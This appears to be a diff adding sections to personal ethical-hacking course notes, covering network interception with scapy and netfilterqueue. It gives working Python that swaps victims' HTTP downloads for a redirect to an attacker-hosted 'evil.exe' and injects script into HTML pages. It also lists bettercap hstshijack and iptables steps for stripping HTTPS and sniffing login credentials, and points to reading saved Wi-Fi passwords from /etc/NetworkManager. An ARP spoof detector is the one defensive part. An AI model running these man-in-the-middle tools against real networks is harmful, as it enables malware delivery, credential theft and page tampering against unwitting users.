@@ -577,6 +577,340 @@ queue.run()
 
 
 # Section 8: Writing a File Interceptor
+In this section we're going to modify data in the htttp layer and in particular replace downlaod requests. 
 > <span style="color:red;"> Note: packet sent over the http layer are placed in the Raw layer. </span>
 
+#### Filtering Traffic based on the port used
+The goal is to write a program that can detect whrn a user requests to download  a dertian file. When detected, we will serve the user with a different file.
 
+ The template for this program will be the DNS spoof progam from the previous section.
+
+ We need to check for http(s) request and response.
+
+ > An example of a packet with different layers. In particular this is a request being sent beacuce in the TCP layer, the field dport is set to http(s).
+
+ ```http layer
+
+ None
+###[ IP ]### 
+  version   = 4
+  ihl       = 5
+  tos       = 0x0
+  len       = 79
+  id        = 23667
+  flags     = DF
+  frag      = 0
+  ttl       = 64
+  proto     = tcp
+  chksum    = 0xc1c2
+  src       = 10.0.2.15
+  dst       = 34.117.237.239
+  \options   \
+###[ TCP ]### 
+     sport     = 40994
+     dport     = https
+     seq       = 2539263128
+     ack       = 898289
+     dataofs   = 5
+     reserved  = 0
+     flags     = PA
+     window    = 64028
+     chksum    = 0xb848
+     urgptr    = 0
+     options   = []
+###[ Raw ]### 
+        load      = '\x17\x03\x03\x00"
+ ```
+
+A response will have the sport set to http(s)
+
+```python
+#!/usr/bin/env python3 
+
+import netfilterqueue as nq
+import scapy.all as scapy
+
+def process_packet(packet):
+    scapy_packet = scapy.IP(packet.get_payload())
+    if scapy_packet.haslayer(scapy.Raw):
+        #print(scapy_packet.show())
+        if scapy_packet[scapy.TCP].dport == 80:
+            print(f'HTTP Request')
+            print(scapy_packet.show())
+        elif scapy_packet[scapy.TCP].sport == 80:
+            print(f'HTTP Response')
+            print(scapy_packet.show())
+
+
+    packet.accept()
+
+queue = nq.NetfilterQueue()
+queue.bind(0, process_packet)
+queue.run()
+
+
+```
+
+#### Analysing and Intercepting HTTP requests and moifying Responses
+> This is an http request
+```http layer 
+HTTP Request
+###[ IP ]### 
+  version   = 4
+  ihl       = 5
+  tos       = 0x0
+  len       = 473
+  id        = 58839
+  flags     = DF
+  frag      = 0
+  ttl       = 64
+  proto     = tcp
+  chksum    = 0x3ed3
+  src       = 10.0.2.15
+  dst       = 143.186.120.171
+  \options   \
+###[ TCP ]### 
+     sport     = 38990
+     dport     = http
+     seq       = 2581237551
+     ack       = 2682544
+     dataofs   = 5
+     reserved  = 0
+     flags     = PA
+     window    = 64240
+     chksum    = 0x75c
+     urgptr    = 0
+     options   = []
+###[ Raw ]### 
+        load      = 'GET /testsite/downloads/Hello.txt HTTP/1.1\r\nHost: demo.borland.com\r\nUser-Agent: 
+        Mozilla/5.0 (X11; Linux x86_64; rv:102.0) ...
+
+
+
+
+
+
+HTTP Response
+###[ IP ]### 
+  version   = 4
+  ihl       = 5
+  tos       = 0x0
+  len       = 502
+  id        = 22341
+  flags     = 
+  frag      = 0
+  ttl       = 255
+  proto     = tcp
+  chksum    = 0x4e48
+  src       = 143.186.120.171
+  dst       = 10.0.2.15
+  \options   \
+###[ TCP ]### 
+     sport     = http
+     dport     = 38990
+     seq       = 2682544
+     ack       = 2581237984
+     dataofs   = 5
+     reserved  = 0
+     flags     = PA
+     window    = 32335
+     chksum    = 0xd0f2
+     urgptr    = 0
+     options   = []
+###[ Raw ]### 
+        load      = 'HTTP/1.1 200 OK\r\nContent-Type: text/plain\ ...
+```
+
+
+> ack = 2682544 in  Request is same as seq = 2682544 in response: This shows that the response corresponds to the request made.
+
+#### Intercepting and Replacing downloads on the network
+1. Run the arp_spoof.py to become man in the middle
+2. Run the replace_download.py to replace the victims download request.
+
+```python
+#!/usr/bin/env python3 
+
+import netfilterqueue as nq
+import scapy.all as scapy
+
+ack_list = []
+attack_load = "HTTP/1.1 301 Moved Permanently\nLocation: http://10.0.2.15/evil-files/evil.exe\n\n"
+
+def set_load(scapy_packet, load):
+    print(f'[+] replacing file')
+    scapy_packet[scapy.Raw].load = load
+    del scapy_packet[scapy.IP].len
+    del scapy_packet[scapy.IP].chksum
+    del scapy_packet[scapy.TCP].chksum
+
+    return scapy_packet
+    
+
+def process_packet(packet):
+    scapy_packet = scapy.IP(packet.get_payload())
+    if scapy_packet.haslayer(scapy.Raw):
+        #print(scapy_packet.show())
+        if scapy_packet[scapy.TCP].dport == 80:
+            print(f'HTTP Request')
+            if '.txt'.encode() in scapy_packet[scapy.Raw].load:
+                print(f'[+] txt Request')
+                ack_list.append(scapy_packet[scapy.TCP].ack)
+                print(scapy_packet.show())
+        elif scapy_packet[scapy.TCP].sport == 80:
+            print(f'HTTP Response')
+            if scapy_packet[scapy.TCP].seq in ack_list:
+                ack_list.remove(scapy_packet[scapy.TCP].seq)
+                modified_scapy_packet = set_load(scapy_packet, attack_load)
+
+                packet.set_payload(bytes(modified_scapy_packet))
+                #print(scapy_packet.show())
+
+
+    packet.accept()
+
+queue = nq.NetfilterQueue()
+queue.bind(0, process_packet)
+queue.run()
+```
+
+# Section 9: Writing a Code Injector
+In http requests, removing the ***Accept-Encoding: gzip, ...*** from the load in the raw layer will allow the browzer present html in plain text.
+
+
+### Code for injection
+```python
+#!/usr/bin/env python3 
+
+import netfilterqueue as nq
+import scapy.all as scapy
+import re
+
+def set_load(scapy_packet, load):
+    print(f'[+] replacing file')
+    scapy_packet[scapy.Raw].load = load
+    del scapy_packet[scapy.IP].len
+    del scapy_packet[scapy.IP].chksum
+    del scapy_packet[scapy.TCP].chksum
+
+    return scapy_packet
+    
+
+def process_packet(packet):
+    scapy_packet = scapy.IP(packet.get_payload())
+    #print(type(scapy_packet))
+    if scapy_packet.haslayer(scapy.Raw):
+        load = scapy_packet[scapy.Raw].load
+        #print(scapy_packet.show())
+        if scapy_packet[scapy.TCP].dport == 80:
+            print(f'HTTP Request')
+            load=re.sub("Accept-Encoding:.*?\r\n".encode(), "".encode(), load)
+            #print(scapy_packet.show())
+        elif scapy_packet[scapy.TCP].sport == 80:
+            print(f'HTTP Response')
+            injection_code = "<script>alert('Test');</script>"
+            load = load.replace("</body>".encode(), (injection_code+"</body>").encode())
+
+            # Rexgex: Non-capturing group
+            content_length_search = re.search("(?:Content-Length:\s)(\d*)".encode(), load)
+            
+            if content_length_search and "text/html".encode() in load:
+                content_length = content_length_search.group(1)
+                new_content_length = int(content_length) + len(injection_code)
+                load = load.replace(content_length, str(new_content_length).encode())
+                print(f'Previous content length: {int(content_length)}\
+                     \n Current content length: {new_content_length}')
+            #print(scapy_packet.show()) 
+
+        # This gets executed if the load is modified   
+        if load != scapy_packet[scapy.Raw].load:
+            new_packet = set_load(scapy_packet, load)
+            packet.set_payload(bytes(new_packet))
+
+
+    packet.accept()
+
+queue = nq.NetfilterQueue()
+queue.bind(0, process_packet)
+queue.run()
+
+
+```
+
+
+# Section 10: Bypassing HTTPS
+- Watch again
+Use the following implementation of a network penetetrating tool called ***bettercap*** 
+> bettercap - iface eth0 -caplet hstshijack/hstshijac
+> bettercap: replce  80 with 8080 in replace_download.py. 
+
+
+- Need to modify the ports in code_injector program
+
+
+> <span style="color:red;"> Some websites use use hsts: Here, bypassing https fails for now. </span>
+
+
+### Bypassing https and Sniffing Loging credentials.
+1. Run packet_sniffer.py
+2. Run arp_spoof.py to make attaker MITM.
+3. Execute the command
+    >  bettercap -iface eth0 -caplet /usr/share/bettercap/caplets/hstshijack/hstshijack.cap
+
+### Replacing downloads on https
+1. Run arp_spoof.py to make attaker MITM.
+2. Execute the command
+    > bettercap -iface eth0 -caplet /usr/share/bettercap/caplets/hstshijack/hstshijack.cap
+3. Run the following commands:
+    > iptables -I INPUT -j NFQUEUE --queue-num 0
+    > iptables -I OUTPUT -j NFQUEUE --queue-num 0 
+4. Run replace_download_https.py 
+
+### Injecting code in https pages
+1. Run arp_spoof.py to make attaker MITM.
+2. Execute the command
+    > bettercap -iface eth0 -caplet /usr/share/bettercap/caplets/hstshijack/hstshijack.cap
+3. Run the following commands:
+    > iptables -I INPUT -j NFQUEUE --queue-num 0
+    > iptables -I OUTPUT -j NFQUEUE --queue-num 0 
+4. Run code_injection_https.py 
+
+
+# Section 11: Writing an ARP Spoof detector
+```python
+#!/usr/bin/env python3
+
+import scapy.all as scapy
+
+def get_mac(ip)-> str:
+   arp_request = scapy.ARP(pdst = ip)
+   broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+   arp_request_broadcast = broadcast/arp_request
+   answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
+   return answered_list[0][1].hwsrc
+
+def sniffer(interface):
+    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
+
+def process_sniffed_packet(packet):
+    if packet.haslayer(scapy.ARP) and packet[scapy.ARP].op == 2:
+        try:
+            real_mac = get_mac(packet[scapy.ARP].psrc)
+            response_mac = packet[scapy.ARP].hwsrc
+            if real_mac != response_mac:
+                print(f"[+] You're under attack !!")
+        except IndexError:
+            pass
+        #print(packet.show())
+
+       
+        
+    
+
+sniffer("eth0")
+```
+
+# Section 12: Writing Malware
+#### Getting Wifi Passwords on Linux
+On Linux, all previously connected networks are located in the folder 
+> /etc/NetworkManager/system-connections as INI files. So we just have to read the files and print the information.
